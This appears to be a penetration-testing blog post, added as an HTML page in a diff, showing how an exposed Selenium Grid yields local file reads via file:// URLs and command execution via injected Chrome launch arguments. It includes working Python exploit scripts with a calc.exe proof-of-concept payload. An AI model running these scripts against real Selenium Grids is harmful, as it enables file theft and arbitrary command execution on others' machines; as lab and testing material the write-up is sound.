@@ -1,0 +1,183 @@
+<!DOCTYPE HTML>
+<!--
+	Iridium by TEMPLATED
+    templated.co @templatedco
+    Released for free under the Creative Commons Attribution 3.0 license (templated.co/license)
+-->
+<html>
+	<head>
+		<title>NutCrackers Security</title>
+		<meta http-equiv="content-type" content="text/html; charset=utf-8" />
+		<meta name="description" content="" />
+		<meta name="keywords" content="" />
+		<link href='http://fonts.googleapis.com/css?family=Arimo:400,700' rel='stylesheet' type='text/css'>
+		<!--[if lte IE 8]><script src="js/html5shiv.js"></script><![endif]-->
+
+			<link rel="stylesheet" href="css/skel-noscript.css" />
+			<link rel="stylesheet" href="css/posts.css" />
+			<link rel="stylesheet" href="css/style-desktop.css" />
+		<!--[if lte IE 8]><link rel="stylesheet" href="css/ie/v8.css" /><![endif]-->
+		<!--[if lte IE 9]><link rel="stylesheet" href="css/ie/v9.css" /><![endif]-->
+		<!--<link rel="stylesheet" href="styles/ocean.css">-->
+		<link rel="stylesheet" href="styles/srcery.css">
+		<script src="highlight.pack.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+
+	</head>
+	<body class="homepage">
+
+		<!-- Header -->
+		<div>
+			<div class="container">
+
+				<!-- Logo -->
+				<div>
+					<ul class="default">
+						<li><a href="index.html">Home</a></li>
+						<li><a href="blog.html">Blog</a></li>
+						<li><a href="archive.html">Archive</a></li>
+					</ul>
+				</div>
+
+				<!-- Nav -->
+			</div>
+		</div>
+
+		<!-- Main -->
+		<div id="main">
+			<div class="container">
+				<div class="row">
+
+					<!-- Content -->
+					<div id="content" class="8u skel-cell-important">
+						<section>
+							<header>
+
+	<span class="byline"><a href="selenium.html"><b>Tips and tricks: Selenium LFI to RCE</a></b></span>
+									                <img src="imagini/selenium.png" alt="" style="height:275px;width:580px;" />
+									                <p>Hello everyone T3jv1l here, today I will share a few notes about selenium. I will show you a case I encountered doing penetration testing and how I was able to get LFI and RCE in Selenium Grid.
+                                    <p>Prepare a lab environment. Install java from  <b><a href=https://www.java.com/download/ie_manual.jsp>((https://www.java.com/download/ie_manual.jsp))</a></b>. Download the latest version of Selenium Grid <b><a href="https://selenium-release.storage.googleapis.com/3.141/selenium-server-standalone-3.141.59.jar">((https://selenium-release.storage.googleapis.com/3.141/selenium-server-standalone-3.141.59.jar))</a></b>. Download the webdrive version of your browser. If you don't know your version, download any version and when you run selenium it will give you the error that you don't have version X installed and you will reinstall it <b><a href="https://chromedriver.chromium.org/downloads">((https://chromedriver.chromium.org/downloads))</a></b></p>
+                                    <p></p><p>Start selenium:</p>
+<p><pre><code>java -jar C:\Users\nutcrackers\Downloads\selenium-server-standalone-3.141.59.jar -role node -hub http://127.0.0.1:4444/grid/register -browser "browserName=firefox,maxInstances=3,platform=WINDOWS" -browser "browserName=chrome,maxInstances=2,platform=WINDOWS" -Dwebdriver.chrome.driver="C:\Selenium\chromedriver.exe"
+</pre></code></p>
+<br></br>
+<p><img src="imagini/selenium1.png" /></p>
+<img src="imagini/selenium2.png" alt=""  style="height:275px;width:790px;"/>
+  <p></p><p>Now all setup is done. Let's start. The first time we will set up our webdriver using python. The selenium.webdriver module provides all the WebDriver implementations. Currently supported WebDriver implementations are Firefox, Chrome and more browser. To create the instance for Chrome and Firefox remote we will use:</p>
+<p><pre><code>driver = webdriver.Remote
+</pre></code></p>
+<p>The driver.get method will navigate to a page given by the URL here is the trick because we will put our payload here for LFI (file:///C:/). WebDriver will wait until the page has fully loaded (that is, the “onload” event has fired) before returning control to your test or script.</p>
+<p><pre><code>driver.get("file:///C:/Users/nutcrackers")
+</pre></code></p>
+Now we need to display all information from driver.get module, we will use driver.page_source:
+<p><pre><code>print(driver.page_source)
+</pre></code></p>
+<p>Final exploit for LFI is:</p>
+<p><pre><code>from selenium import webdriver
+from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
+
+# load webdrive module from chrome instance/session
+driver = webdriver.Remote(
+   command_executor='http://192.168.1.130:4444/wd/hub',
+   desired_capabilities=DesiredCapabilities.CHROME,
+
+)
+driver.get("file:///C:/Users/nutcrackers") # display info
+print(driver.page_source)
+driver.quit()
+</pre></code></p><br>
+<p><img src="imagini/selenium3.png" /></p>
+<p>Open index.html</p>
+<p><img src="imagini/selenium4.png" style="height:275px;width:790px;" /></p>
+<p>Now for remote code execution (RCE) is a little trick. We need to use the arguments from the browser to run powershell.exe or in this example a calc.exe</p>
+<p><pre><code>from selenium import webdriver
+from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
+
+payload='calc.exe #' #payload just for POC
+# execute chrome arguments
+chrome_options = webdriver.ChromeOptions()
+chrome_options.add_argument("--no-sandbox")
+chrome_options.add_argument("--utility-and-browser")
+chrome_options.add_argument("--utility-cmd-prefix="+payload)
+
+driver = webdriver.Remote(
+   command_executor='http://192.168.1.130:4444/wd/hub',
+   desired_capabilities=DesiredCapabilities.CHROME,
+   options=chrome_options
+)
+driver.get("https://google.com")
+driver.quit()
+</pre></code></p><br>
+<p>This script will be executed in loop!!!</p>
+<p><img src="imagini/selenium5.png" style="height:375px;width:790px;"/></p>
+
+    <h1><b>References!!</b></h1>
+<p><a href="https://selenium-python.readthedocs.io/getting-started.html#simple-usage">https://selenium-python.readthedocs.io/getting-started.html#simple-usage</a></p>
+<p><a href="https://chromedriver.chromium.org/downloads">https://chromedriver.chromium.org/downloads</a></p>
+
+
+
+
+
+						</section>
+					</div>
+
+					<!-- Sidebar -->
+					<div id="sidebar" class="4u">
+						<section>
+							<header>
+								<h2>Blog posts</h2>
+							</header>
+							<ul class="style">
+								<li>
+                  <p class="posted">July 30, 2021 </p>
+                  <p class="text" style="bottom:10px; position: relative"><a href="selenium.html">Tips and tricks: Selenium LFI to RCE</a></p>
+									<p class="posted">February 6, 2021 </p>
+									<p class="text" style="bottom:10px; position: relative"><a href="Transfer.html">File Transfer In Red Team/Penetration Testing</a></p>
+									<p class="posted">January 15, 2020 </p>
+									<p class="text" style="bottom:10px; position: relative"><a href="PE-file.html">PE Portable Executable File Format</a></p>
+									<p class="posted">November 14, 2019 </p>
+									<p class="text" style="bottom:10px; position: relative"><a href="crack.html">Cracking The PassFab RAR Software</a></p>
+									<p class="posted">March 3, 2019 </p>
+									<p class="text" style="bottom:10px; position: relative"><a href="Forensics.html">Volatility: Extract Password From RAM</a></p>
+									<p class="posted">February 28, 2019 </p>
+									<p class="text" style="bottom:10px; position: relative"><a href="Windows7.html">Windows Exploit Development Part VII</a></p>
+									<p class="posted">February 16, 2019 </p>
+									<p class="text" style="bottom:10px; position: relative"><a href="Windows6.html">Windows Exploit Development Part VI</a></p>
+									<p class="posted">February 16, 2019 </p>
+									<p class="text" style="bottom:10px; position: relative"><a href="Windows5.html">Windows Exploit Development Part V</a></p>
+									<p class="posted">January 22, 2019 </p>
+									<p class="text" style="bottom:10px; position: relative"><a href="Windows4.html">Windows Exploit Development Part IV</a></p>
+									<p class="posted">January 16, 2019 </p>
+									<p class="text" style="bottom:10px; position: relative"><a href="Windows3.html">Windows Exploit Development Part III</a></p>
+									<p class="posted">January 16, 2019 </p>
+									<p class="text" style="bottom:10px; position: relative"><a href="Windows2.html">Windows Exploit Development Part II</a></p>
+									<p class="posted">January 1, 2019 </p>
+									<p class="text" style="bottom:10px; position: relative"><a href="WED.html">Windows Exploit Development Part I</a></p>
+									<p class="posted">December 11, 2018 </p>
+									<p class="text" style="bottom:10px; position: relative"><a href="Shellcode1.html">How to create your shellcode part II</a></p>
+									<p class="posted">January 9, 2018 </p>
+									<p class="text" style="bottom:10px; position: relative"><a href="Shellcode.html">How to create your own shellcode part I</a></p>
+									<p class="posted">January 4, 2018 </p>
+									<p class="text" style="bottom:10px; position: relative"><a href="Ubuntu.html">The Linux Commands you should NEVER use</a></p>
+									<p class="posted">January 3, 2018 </p>
+									<p class="text" style="bottom:10px; position: relative"><a href="Nmap.html">Nmap Firewall Scan</a></p>
+								</li>
+							</ul>
+						</section>
+					</div>
+				</div>
+			</div>
+		</div>
+
+		<!-- Footer -->
+
+		<!-- Copyright -->
+		<div id="copyright">
+			<div class="container">
+					Copyright &copy 2021 T3jv1l. All Rights Reserved. Created and designed by Mr.Leritaite.
+			</div>
+		</div>
+
+	</body>
+</html>
